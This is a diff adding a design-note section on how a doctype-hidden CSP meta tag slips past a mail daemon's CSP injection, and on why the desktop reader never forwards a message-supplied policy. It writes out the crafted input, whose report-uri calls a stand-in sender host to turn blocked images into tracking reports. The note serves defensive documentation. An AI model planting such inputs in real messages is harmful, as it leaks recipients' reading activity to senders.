@@ -2248,3 +2248,10 @@ The cost is one extra handshake per launch; the alternative, an `open` that loop
 
 `Session::call_within` flattens `ClientError::Rpc` into `"{method}: the daemon refused the call: {message} ({code})"` before it crosses the call channel.
 The desktop client reads the code back off the trailing parenthesis (`error::rpc_code`) to tell `-32602` from `-32004` or `-32005`; a typed error on the session's channel would remove that parsing.
+
+## A CSP hidden in the doctype outruns the daemon's tag
+
+`inject_csp_meta` (`crates/mp-core/src/parse.rs`) inserts its tag after the doctype's first `>`, and its stripping regex matches only `http-equiv` before `content`.
+A sender who writes `<!doctype html <meta content="default-src 'none'; report-uri https://t.example/r" http-equiv=Content-Security-Policy>` keeps that string, and it lands ahead of the daemon's tag; the browser reads it as part of the doctype, so the document itself is safe.
+A reader that copies "the first CSP meta" into a response header is not: a header may carry `report-uri`, a meta may not, and every blocked remote image becomes a violation report to the sender.
+The desktop reader (`clients/desktop/src-tauri/src/reader.rs`) therefore sends its own `MESSAGE_CSP` constant as the header and never a value taken from the message; fixture row 1006 carries the trick.
